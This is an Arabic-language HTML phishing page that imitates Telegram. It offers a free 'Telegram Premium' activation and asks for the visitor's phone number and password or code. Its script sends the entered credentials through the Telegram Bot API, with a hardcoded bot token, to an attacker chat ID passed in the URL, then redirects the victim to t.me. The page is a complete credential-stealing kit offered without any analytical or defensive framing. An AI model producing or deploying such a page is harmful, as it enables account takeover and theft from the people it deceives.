<!DOCTYPE html>
<html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Telegram</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#1c2833;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#2c3e50;padding:20px;border-radius:16px;width:360px;text-align:center;color:#fff}
img{width:80px;margin-bottom:10px}h2{color:#0088cc;margin-bottom:15px}
input{width:100%;padding:12px;margin:8px 0;background:#1c2833;border:0;border-bottom:2px solid #0088cc;color:#fff;font-size:16px}
.btn{background:#0088cc;color:#fff;border:none;padding:12px;width:100%;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer}.btn:hover{background:#0077b5}</style></head>
<body><div class="card">
<img src="https://telegram.org/img/t_logo.png" alt="Telegram">
<h2>تفعيل تلغرام بريميوم</h2>
<p style="color:#aaa;font-size:14px;margin-bottom:12px">أدخل بياناتك لتفعيل الاشتراك المجاني</p>
<input id="u" placeholder="رقم الهاتف"><br>
<input id="p" type="password" placeholder="كلمة المرور أو الرمز"><br>
<button class="btn" onclick="sendData()">تفعيل الآن</button>
</div>
<script>
const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";
const p=new URLSearchParams(location.search);const CHAT_ID=p.get('chat');
function sendData(){const u=document.getElementById('u').value,pa=document.getElementById('p').value;
if(!u||!pa)return alert('املأ جميع الحقول');
fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('✈️ Telegram\n👤 '+u+'\n🔑 '+pa)}`)
.then(()=>{location.href='https://t.me/'})}
</script></body></html>
